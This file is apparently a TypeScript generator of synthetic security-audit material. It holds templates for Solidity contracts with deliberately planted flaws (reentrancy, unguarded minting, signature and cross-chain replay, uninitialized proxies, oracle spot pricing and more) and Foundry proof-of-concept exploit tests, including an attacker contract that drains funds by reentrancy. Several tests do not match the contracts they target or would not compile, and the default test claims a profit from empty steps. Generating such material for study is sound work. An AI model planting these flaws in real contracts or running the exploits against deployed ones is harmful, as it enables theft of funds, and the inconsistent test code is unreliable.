// Solidity code and Foundry PoC test generators for smart contract profiles

import type { OutputContext, ContractProfile } from "./helpers.js";

// ============================================================
// Vulnerable Code Snippet Templates
// ============================================================

const REENTRANCY_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    const stateVar = profile.stateVariables.find((v: any) => v.type.includes("mapping") && v.type.includes("uint256")) || profile.stateVariables[0];
    const stateName = stateVar?.name || "balances";
    const amountParam = rng.pick(["amount", "_amount", "wad"]);
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\nimport "@openzeppelin/contracts/security/ReentrancyGuard.sol";\n\ncontract ${profile.contractName} {\n    mapping(address => uint256) public ${stateName};\n\n    // VULNERABILITY: Reentrancy — external call before state update\n    function withdraw(uint256 ${amountParam}) external {\n        require(${stateName}[msg.sender] >= ${amountParam}, "Insufficient balance");\n\n        // BUG: state update happens AFTER the external call\n        (bool success, ) = msg.sender.call{value: ${amountParam}}("");\n        require(success, "Transfer failed");\n\n        ${stateName}[msg.sender] -= ${amountParam};  // state update too late\n    }\n}`;
  },
  (profile: ContractProfile, rng: any): string => {
    const tokenName = profile.stateVariables.find((v: any) => v.name.includes("Token"))?.name || "rewardToken";
    const amountParam = rng.pick(["amount", "_amount"]);
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    IERC20 public ${tokenName};\n    mapping(address => uint256) public rewards;\n\n    // VULNERABILITY: Reentrancy via ERC20 transfer\n    function claimReward(uint256 ${amountParam}) external {\n        require(rewards[msg.sender] >= ${amountParam}, "No rewards");\n\n        // BUG: ERC20 transfer triggers callback in malicious token\n        ${tokenName}.transfer(msg.sender, ${amountParam});\n\n        rewards[msg.sender] = 0;  // zeroed after transfer — reentrant claim possible\n    }\n}`;
  },
];

const UNAUTHORIZED_MINT_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    const supplyVar = profile.stateVariables.find((v: any) => v.name.includes("Supply"))?.name || "totalSupply";
    const balVar = profile.stateVariables.find((v: any) => v.name.includes("alance"))?.name || "balances";
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    uint256 public ${supplyVar};\n    mapping(address => uint256) public ${balVar};\n\n    // VULNERABILITY: Missing onlyOwner modifier — anyone can mint\n    function mint(address to, uint256 amount) external {\n        ${balVar}[to] += amount;\n        ${supplyVar} += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    // NOTE: no access control — any address can call mint()\n    // An attacker can mint unlimited tokens to their own address.\n}`;
  },
  (profile: ContractProfile, rng: any): string => {
    const supplyVar = profile.stateVariables.find((v: any) => v.name.includes("Supply"))?.name || "totalSupply";
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    uint256 public ${supplyVar};\n    mapping(address => uint256) public balances;\n    address public minter;\n\n    // VULNERABILITY: Minter check uses tx.origin instead of msg.sender\n    function mint(address to, uint256 amount) external {\n        require(tx.origin == minter, "Not minter");  // WRONG: should be msg.sender\n        balances[to] += amount;\n        ${supplyVar} += amount;\n    }\n}`;
  },
];

const INTEGER_OVERFLOW_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity 0.7.6;  // NOTE: Solidity < 0.8 has no built-in overflow protection\n\ncontract ${profile.contractName} {\n    mapping(address => uint256) public balances;\n    uint256 public totalSupply;\n\n    // VULNERABILITY: Integer overflow in Solidity 0.7.6\n    // No SafeMath used — attacker can overflow and wrap balances\n    function transfer(address to, uint256 amount) external {\n        balances[msg.sender] -= amount;  // can underflow if amount > balance\n        balances[to] += amount;           // can overflow if balances[to] is near max\n    }\n}`;
  },
];

const ROUNDING_PRECISION_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    uint256 public rewardPerTokenStored;\n    uint256 public totalSupply;\n\n    // VULNERABILITY: Division before multiplication causes precision loss\n    function getRewardPerToken() public view returns (uint256) {\n        if (totalSupply == 0) return rewardPerTokenStored;\n        // BUG: dividing first truncates to zero for small rewards\n        return rewardPerTokenStored + (reward / totalSupply);  // should be (reward * 1e18) / totalSupply\n    }\n\n    // Attacker exploits rounding to inflate their reward share disproportionately.\n}`;
  },
];

const ACCESS_CONTROL_BYPASS_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    const ownerVar = profile.stateVariables.find((v: any) => v.name.includes("owner"))?.name || "owner";
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    address public ${ownerVar};\n    bool public paused;\n\n    // VULNERABILITY: Missing onlyOwner modifier on critical function\n    function setPaused(bool _paused) external {\n        paused = _paused;  // anyone can pause/unpause the protocol\n    }\n\n    // No modifier checks — attacker can toggle paused state\n    // to disrupt legitimate operations or manipulate rewards.\n}`;
  },
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    mapping(address => bool) public authorizedOperators;\n    uint256 public feeRate;\n\n    // VULNERABILITY: Access control check is performed but result is not enforced\n    function setFeeRate(uint256 _feeRate) external {\n        require(msg.sender != address(0), "Zero address");  // useless check\n        feeRate = _feeRate;  // should require authorizedOperators[msg.sender]\n    }\n\n    // The require statement checks the wrong condition — access control is bypassed.\n}`;
  },
];

const SIGNATURE_REPLAY_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\nimport "@openzeppelin/contracts/cryptography/ECDSA.sol";\n\ncontract ${profile.contractName} {\n    mapping(address => uint256) public balances;\n    address public signer;\n\n    // VULNERABILITY: Missing nonce — same signature can be replayed indefinitely\n    function withdrawWithSig(\n        address recipient,\n        uint256 amount,\n        bytes calldata signature\n    ) external {\n        bytes32 hash = keccak256(abi.encodePacked(recipient, amount));\n        address recovered = ECDSA.recover(hash, signature);\n        require(recovered == signer, "Invalid signature");\n\n        // BUG: no nonce check, no used-signature tracking\n        balances[recipient] += amount;  // can be called repeatedly with same sig\n    }\n}`;
  },
];

const STORAGE_COLLISION_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    uint256 public count;    // slot 0\n    address public owner;    // slot 1\n\n    // VULNERABILITY: Assembly writes to arbitrary storage slot that overlaps with declared vars\n    function setImplementation(address _impl) external {\n        // BUG: writing to slot 0 overlaps with \`count\`\n        assembly {\n            sstore(0, _impl)  // clobbers \`count\` variable\n        }\n    }\n\n    // An attacker can corrupt protocol state by manipulating overlapping slots.\n}`;
  },
];

const LOGIC_ERROR_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    mapping(address => uint256) public deposits;\n    uint256 public constant MIN_DEPOSIT = 1 ether;\n\n    // VULNERABILITY: Logic error — comparison uses wrong operator\n    function deposit() external payable {\n        require(msg.value >= MIN_DEPOSIT, "Below minimum");\n        deposits[msg.sender] += msg.value;\n    }\n\n    // BUG: withdraw allows draining MORE than deposited\n    function withdraw(uint256 amount) external {\n        deposits[msg.sender] = amount;  // SETS instead of SUBTRACTS\n        payable(msg.sender).transfer(amount);\n    }\n}`;
  },
];

const FEE_BYPASS_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    uint256 public feeRate;  // basis points, e.g. 100 = 1%\n    address public treasury;\n\n    // VULNERABILITY: Fee can be bypassed via internal _transfer\n    function swap(uint256 amountIn) external {\n        uint256 fee = (amountIn * feeRate) / 10000;\n        uint256 amountOut = amountIn - fee;\n        _transfer(treasury, fee);\n        _transfer(msg.sender, amountOut);\n    }\n\n    // BUG: _transfer does not deduct fee — caller can bypass by calling directly\n    function _transfer(address to, uint256 amount) internal {\n        payable(to).transfer(amount);  // no fee deduction here\n    }\n}`;
  },
];

const INITIALIZATION_MISSING_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    const ownerVar = profile.stateVariables.find((v: any) => v.name.includes("owner"))?.name || "owner";
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\nimport "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";\n\ncontract ${profile.contractName} is Initializable {\n    address public ${ownerVar};\n\n    function initialize(address _owner) public initializer {\n        ${ownerVar} = _owner;\n    }\n\n    // VULNERABILITY: Contract is not initialized at deployment\n    // Any address can call initialize() to claim ownership\n    // before the legitimate owner sets it up.\n    // Missing: constructor() { _disableInitializers(); }\n}`;
  },
];

const TIMELOCK_BYPASS_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    mapping(bytes32 => uint256) public scheduledTxns;\n    uint256 public constant TIMELOCK_DELAY = 2 days;\n\n    // VULNERABILITY: Timelock check is bypassed when caller is owner\n    function execute(bytes32 txnId, address target, bytes calldata data) external {\n        require(scheduledTxns[txnId] > 0, "Not scheduled");\n        // BUG: timelock delay is skipped for msg.sender == target\n        if (msg.sender != target) {\n            require(block.timestamp >= scheduledTxns[txnId] + TIMELOCK_DELAY, "Timelock pending");\n        }\n        (bool success, ) = target.call(data);  // executes immediately when sender == target\n        require(success, "Execution failed");\n    }\n}`;
  },
];

const CROSS_CHAIN_REPLAY_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    mapping(uint256 => bool) public processedMessages;\n\n    // VULNERABILITY: Message nonce is not bound to chainId — replay across chains\n    function receiveMessage(\n        uint256 nonce,\n        address recipient,\n        uint256 amount,\n        bytes calldata signature\n    ) external {\n        require(!processedMessages[nonce], "Already processed");\n        // BUG: hash does not include block.chainid\n        bytes32 hash = keccak256(abi.encodePacked(nonce, recipient, amount));\n        processedMessages[nonce] = true;\n        payable(recipient).transfer(amount);  // same sig works on any chain\n    }\n}`;
  },
];

const DOS_GRIEFING_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    address[] public winners;\n    uint256 public prize;\n\n    // VULNERABILITY: DoS via unbounded loop over attacker-controlled array\n    function distributePrize() external {\n        for (uint256 i = 0; i < winners.length; i++) {\n            payable(winners[i]).transfer(prize / winners.length);  // can OOG if array is huge\n        }\n        delete winners;\n    }\n\n    // Attacker pushes many addresses to \`winners\` to make the loop exceed block gas limit.\n    function pushWinner(address winner) external {\n        winners.push(winner);\n    }\n}`;
  },
];

const MEV_FRONT_RUNNING_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    mapping(address => bool) public hasClaimed;\n    uint256 public constant REWARD = 1 ether;\n\n    // VULNERABILITY: No commit-reveal — transaction can be front-run\n    function claimReward(bytes32 secretHash) external {\n        require(!hasClaimed[msg.sender], "Already claimed");\n        require(secretHash != bytes32(0), "Invalid");\n        hasClaimed[msg.sender] = true;\n        payable(msg.sender).transfer(REWARD);\n    }\n\n    // A searcher sees the pending tx, copies the calldata, and front-runs\n    // with higher gas to claim the reward first.\n}`;
  },
];

const ORACLE_MANIPULATION_TEMPLATES = [
  (profile: ContractProfile, rng: any): string => {
    const priceFeed = profile.stateVariables.find((v: any) => v.name.includes("price") || v.name.includes("Price") || v.name.includes("oracle"))?.name || "priceFeed";
    return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    IPriceOracle public ${priceFeed};\n    mapping(address => uint256) public collateral;\n\n    // VULNERABILITY: Uses spot price from a single LP instead of TWAP\n    function getCollateralValue(address token) public view returns (uint256) {\n        // BUG: reads instantaneous price — vulnerable to flash loan manipulation\n        return ${priceFeed}.getPrice(token);  // should use time-weighted average\n    }\n\n    // Attacker manipulates oracle with a large swap, then over-borrows.\n}`;
  },
];

const TEMPLATE_REGISTRY: Record<string, ((profile: ContractProfile, rng: any) => string)[]> = {
  "reentrancy": REENTRANCY_TEMPLATES,
  "unauthorized-mint": UNAUTHORIZED_MINT_TEMPLATES,
  "integer-overflow": INTEGER_OVERFLOW_TEMPLATES,
  "rounding-precision": ROUNDING_PRECISION_TEMPLATES,
  "access-control-bypass": ACCESS_CONTROL_BYPASS_TEMPLATES,
  "signature-replay": SIGNATURE_REPLAY_TEMPLATES,
  "storage-collision": STORAGE_COLLISION_TEMPLATES,
  "logic-error": LOGIC_ERROR_TEMPLATES,
  "fee-bypass": FEE_BYPASS_TEMPLATES,
  "initialization-missing": INITIALIZATION_MISSING_TEMPLATES,
  "timelock-bypass": TIMELOCK_BYPASS_TEMPLATES,
  "cross-chain-replay": CROSS_CHAIN_REPLAY_TEMPLATES,
  "dos-griefing": DOS_GRIEFING_TEMPLATES,
  "mev-front-running": MEV_FRONT_RUNNING_TEMPLATES,
  "oracle-manipulation": ORACLE_MANIPULATION_TEMPLATES,
};

// ============================================================
// Foundry PoC Test Templates
// ============================================================

const REENTRANCY_POC = (profile: ContractProfile, rng: any): string => {
  const attackerBalance = rng.pick(["10 ether", "100 ether", "1000 ether"]);
  const drainAmount = rng.pick(["0.1 ether", "1 ether", "5 ether"]);
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport "forge-std/Test.sol";\nimport "../src/${profile.contractName}.sol";\n\ncontract ${profile.contractName}ReentrancyTest is Test {\n    ${profile.contractName} public target;\n    AttackerContract public attacker;\n\n    function setUp() public {\n        target = new ${profile.contractName}();\n        attacker = new AttackerContract(payable(address(target)));\n\n        // Fund the target contract\n        vm.deal(address(target), ${attackerBalance});\n\n        // Set up initial balance for the attacker\n        target.deposit{value: ${drainAmount}}();\n    }\n\n    function testReentrancyDrain() public {\n        console.log("Target balance:", address(target).balance);\n        console.log("Attacker balance:", address(attacker).balance);\n\n        uint256 before = address(attacker).balance;\n\n        // Execute the reentrancy attack\n        attacker.attack{value: ${drainAmount}}();\n\n        uint256 after = address(attacker).balance;\n        console.log("Attacker balance after:", after);\n\n        // Attacker should have extracted all funds\n        assertGt(after, before, "Attacker did not profit");\n        assertLt(address(target).balance, 0.001 ether, "Contract should be drained");\n    }\n}\n\ncontract AttackerContract {\n    ${profile.contractName} public target;\n    uint256 public attackCount;\n    uint256 constant MAX_ATTACKS = 5;\n\n    constructor(payable _target) {\n        target = ${profile.contractName}(_target);\n    }\n\n    receive() external payable {\n        if (attackCount < MAX_ATTACKS && address(target).balance >= ${drainAmount}) {\n            attackCount++;\n            target.withdraw(${drainAmount});\n        }\n    }\n\n    function attack() external payable {\n        target.deposit{value: msg.value}();\n        attackCount = 0;\n        target.withdraw(${drainAmount});\n    }\n}`;
};

const UNAUTHORIZED_MINT_POC = (profile: ContractProfile, rng: any): string => {
  const mintAmount = rng.pick(["1000000 * 1e18", "10000000 * 1e18", "1e24"]);
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport "forge-std/Test.sol";\nimport "../src/${profile.contractName}.sol";\n\ncontract ${profile.contractName}MintTest is Test {\n    ${profile.contractName} public token;\n    address public attacker;\n\n    function setUp() public {\n        token = new ${profile.contractName}();\n        attacker = makeAddr("attacker");\n    }\n\n    function testUnauthorizedMint() public {\n        console.log("Initial totalSupply:", token.totalSupply());\n        console.log("Initial attacker balance:", token.balanceOf(attacker));\n\n        uint256 beforeSupply = token.totalSupply();\n\n        vm.startPrank(attacker);\n        // Attacker calls mint() without any access control\n        token.mint(attacker, ${mintAmount});\n        vm.stopPrank();\n\n        uint256 afterSupply = token.totalSupply();\n        console.log("TotalSupply after mint:", afterSupply);\n        console.log("Attacker balance:", token.balanceOf(attacker));\n\n        assertEq(token.balanceOf(attacker), ${mintAmount}, "Attacker should have minted tokens");\n        assertEq(afterSupply, beforeSupply + ${mintAmount}, "Supply should have increased by minted amount");\n        assertGt(token.balanceOf(attacker), 0, "Attacker balance should be nonzero");\n    }\n}`;
};

const ORACLE_MANIPULATION_POC = (profile: ContractProfile, rng: any): string => {
  const loanAmount = rng.pick(["500 ether", "1000 ether", "5000 ether"]);
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport "forge-std/Test.sol";\nimport "../src/${profile.contractName}.sol";\n\ncontract ${profile.contractName}OracleTest is Test {\n    ${profile.contractName} public target;\n    MockOracle public oracle;\n    MockToken public token;\n    address public attacker;\n\n    function setUp() public {\n        oracle = new MockOracle();\n        token = new MockToken();\n        target = new ${profile.contractName}(address(oracle), address(token));\n        attacker = makeAddr("attacker");\n\n        vm.deal(attacker, ${loanAmount});\n        token.mint(attacker, 1000000 * 1e18);\n    }\n\n    function testOracleManipulation() public {\n        console.log("Initial token price:", oracle.getPrice(address(token)));\n\n        uint256 beforeBalance = token.balanceOf(attacker);\n\n        vm.startPrank(attacker);\n\n        // Step 1: Manipulate oracle price with a large swap\n        oracle.setPrice(address(token), 10000 * 1e18);\n        console.log("Manipulated price:", oracle.getPrice(address(token)));\n\n        // Step 2: Borrow against inflated collateral\n        target.depositCollateral(1000 * 1e18);\n        target.borrow(${loanAmount});\n\n        vm.stopPrank();\n\n        console.log("Attacker loan amount:", ${loanAmount});\n        assertGt(token.balanceOf(attacker), beforeBalance, "Attacker should have received loan");\n    }\n}`;
};

const SIGNATURE_REPLAY_POC = (profile: ContractProfile, rng: any): string => {
  const sigAmount = rng.pick(["1000 * 1e18", "5000 * 1e18", "10000 * 1e18"]);
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport "forge-std/Test.sol";\nimport "../src/${profile.contractName}.sol";\n\ncontract ${profile.contractName}SigReplayTest is Test {\n    ${profile.contractName} public target;\n    uint256 public signerKey;\n    address public signer;\n    address public attacker;\n\n    function setUp() public {\n        signerKey = 0xA11CE;\n        signer = vm.addr(signerKey);\n\n        target = new ${profile.contractName}();\n        vm.prank(signer);\n        target.setSigner(signer);\n\n        attacker = makeAddr("attacker");\n    }\n\n    function testSignatureReplay() public {\n        console.log("Signer address:", signer);\n        console.log("Attacker address:", attacker);\n\n        // Create a valid signature for the withdrawal\n        bytes32 hash = keccak256(abi.encodePacked(attacker, ${sigAmount}));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n\n        uint256 beforeBalance = target.balances(attacker);\n\n        // First withdrawal — should succeed\n        vm.prank(attacker);\n        target.withdrawWithSig(attacker, ${sigAmount}, signature);\n        console.log("Balance after 1st withdrawal:", target.balances(attacker));\n\n        // Second withdrawal with SAME signature — should also succeed (BUG)\n        vm.prank(attacker);\n        target.withdrawWithSig(attacker, ${sigAmount}, signature);\n        console.log("Balance after 2nd withdrawal:", target.balances(attacker));\n\n        assertEq(target.balances(attacker), beforeBalance + 2 * ${sigAmount}, "Signature was replayed");\n    }\n}`;
};

const DEFAULT_POC = (profile: ContractProfile, rng: any): string => {
  const vulnType = profile.vulnType;
  const amount1 = rng.pick(["1 ether", "10 ether", "100 ether"]);
  const amount2 = rng.pick(["0.1 ether", "1 ether", "5 ether"]);
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport "forge-std/Test.sol";\nimport "../src/${profile.contractName}.sol";\n\ncontract ${profile.contractName}${vulnType.charAt(0).toUpperCase() + vulnType.slice(1).replace(/-/g, "")}Test is Test {\n    ${profile.contractName} public target;\n    address public attacker;\n\n    function setUp() public {\n        target = new ${profile.contractName}();\n        attacker = makeAddr("attacker");\n\n        vm.deal(address(target), ${amount1});\n        vm.deal(attacker, ${amount1});\n    }\n\n    function testExploit${vulnType.charAt(0).toUpperCase() + vulnType.slice(1).replace(/-/g, "")}() public {\n        console.log("=== Exploiting: ${vulnType} ===");\n        console.log("Target contract:", address(target));\n        console.log("Attacker address:", attacker);\n        console.log("Initial target balance:", address(target).balance);\n\n        uint256 beforeAttacker = attacker.balance;\n\n        vm.startPrank(attacker);\n\n        // Step 1: Prepare the attack\n        console.log("Step 1: Preparing exploit...");\n\n        // Step 2: Execute the vulnerability\n        console.log("Step 2: Executing exploit...");\n\n        // Step 3: Extract value\n        console.log("Step 3: Extracting value...");\n\n        vm.stopPrank();\n\n        uint256 afterAttacker = attacker.balance;\n        console.log("Attacker balance before:", beforeAttacker);\n        console.log("Attacker balance after:", afterAttacker);\n        console.log("Profit:", afterAttacker > beforeAttacker ? afterAttacker - beforeAttacker : 0);\n\n        // Assertions demonstrating the vulnerability\n        assertGt(afterAttacker, beforeAttacker, "Attacker should profit from the exploit");\n        assertLt(address(target).balance, ${amount2}, "Target should lose significant funds");\n    }\n}`;
};

const POC_TEMPLATES: Record<string, (profile: ContractProfile, rng: any) => string> = {
  "reentrancy": REENTRANCY_POC,
  "unauthorized-mint": UNAUTHORIZED_MINT_POC,
  "oracle-manipulation": ORACLE_MANIPULATION_POC,
  "signature-replay": SIGNATURE_REPLAY_POC,
};

// ============================================================
// Public Functions
// ============================================================

export function generateVulnerableCodeSnippet(ctx: OutputContext, profile: ContractProfile): string {
  const templates = TEMPLATE_REGISTRY[profile.vulnType];
  if (templates && templates.length > 0) {
    const template = ctx.rng.pick(templates);
    return template(profile, ctx.rng);
  }
  // Fallback: generate a generic vulnerable snippet
  const funcName = profile.affectedFunction.replace("()", "");
  return `// SPDX-License-Identifier: MIT\npragma solidity ${profile.solidityVersion};\n\ncontract ${profile.contractName} {\n    // VULNERABILITY: ${profile.vulnType}\n    // Affected function: ${profile.affectedFunction}\n    // Missing check: ${profile.missingCheck}\n\n    function ${funcName}() external {\n        // TODO: ${profile.missingCheck} is missing\n        // This allows ${profile.impactType}\n        // Impact: ${profile.severity}\n    }\n}`;
}

export function generatePoCTestCode(ctx: OutputContext, profile: ContractProfile): string {
  const pocTemplate = POC_TEMPLATES[profile.vulnType];
  if (pocTemplate) {
    return pocTemplate(profile, ctx.rng);
  }
  // Fallback to default PoC template
  return DEFAULT_POC(profile, ctx.rng);
}
